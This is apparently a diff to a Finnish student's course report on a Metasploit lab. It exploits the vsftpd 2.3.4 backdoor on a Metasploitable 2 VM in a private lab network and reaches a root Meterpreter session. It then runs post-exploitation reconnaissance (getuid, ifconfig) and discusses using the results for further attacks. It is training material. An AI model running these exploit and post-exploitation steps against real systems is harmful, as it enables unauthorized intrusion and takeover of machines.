@@ -142,3 +142,70 @@ services
 - Tallentaa tulokset suoraan Metasploitin tietokantaan
 - Tuloksia voi suodattaa (services -p 21)
 - Tulokset ovat heti käytettävissä exploit-moduulissa
+
+## f) murtaudu vsftpd-palveluun
+
+Oppitunnilla kävimme läpi tätä samaista tehtävää, muistin aika hyvin ulkoa miten tämä suoritettiin:
+
+<img width="943" height="556" alt="image" src="https://github.com/user-attachments/assets/c00baa78-cad6-4da5-ba36-682eefb0b110" />
+
+Ensimmäisenä etsimme exploitin komennolla:
+```bash
+search vsftpd
+```
+Tuloksena löytyi: *exploit/unix/ftp/vsftpd_234_backdoor*
+
+Latasin exploitin ja asetukset:
+
+```bash
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.56.102
+set LHOST 192.168.56.101
+```
+
+Suoritin hyökkäksen komennolla: *run*
+
+**Tulokset:**
+
+Metasploit havaitsi haavoittuvan FTP-bannerin ja backdoor aktivoitui
+
+```bash
+FTP banner hints at vulnerable: 220 (vsFTPd 2.3.4)
+Backdoor has been spawned!
+Meterpreter session 1 opened (192.168.56.101:4444 -> 192.168.56.102:35196)
+```
+
+#### Lopputulos
+
+Hyökkäys onnistui ja sain meterprete-sessionin kohdekoneeseen.
+Tämä tarkoittaa, että minulla on nyt komentoyhteys Metasploitable 2:een ja voin suorittaa komentoja etänä.
+
+## g) Kerää tietoa metasploitablesta. Analysoi ja selitä miten niitä voisi hyödyntää
+
+Aloitin keräämällä järjestelmätietoja 
+
+<img width="420" height="125" alt="image" src="https://github.com/user-attachments/assets/a72131e1-42de-4429-8bd4-508818be8fad" />
+
+Käytin myös meterpreterissä komentoa: *help*, jotta sain erilaisia komentoja mitä voin käyttää
+
+Komennolla: *getuid* 
+
+<img width="189" height="38" alt="image" src="https://github.com/user-attachments/assets/4e42b7d4-74be-456c-a3de-cdc8fa2e3e25" />
+
+Pääsin näkemään, että istunto oli root-tasolla ja se mahdollistaa tiedostojen lukemisen ja vaikka verkon konfiguraation tarkastelun.
+
+**Verkkotiedot**
+
+<img width="387" height="392" alt="image" src="https://github.com/user-attachments/assets/9eb1eb35-d878-4997-929b-f9177e9e1f55" />
+
+Tulosteessa komennolla: *ifconfig* pääsemme näkemään IP-osoitteet(ipv4,ipv6), MAC-osoitteet tms.
+
+### Analyysi ja hyödyntäminen
+
+Kerätyt tiedot ovat hyödyllisiä jatkohyökkäyksissä:
+
+- Root‑taso antaa täyden hallinnan järjestelmään — hyökkääjä voi asentaa ohjelmia, muuttaa asetuksia tai luoda uusia käyttäjiä.
+- Verkkotiedot paljastavat kohdekoneen IP‑osoitteen ja verkon rakenteen, mikä auttaa laajentamaan hyökkäystä muihin koneisiin samassa verkossa.
+- Järjestelmätiedot (OS, arkkitehtuuri) auttavat valitsemaan oikeat exploitit ja payloadit myöhempää käyttöä varten.
+
+Yhteenvetona: nämä komennot (sysinfo, getuid, ifconfig) muodostavat perustan post‑exploitation‑vaiheelle, jossa hyökkääjä kartoittaa kohteen ja valmistautuu jatkotoimiin.
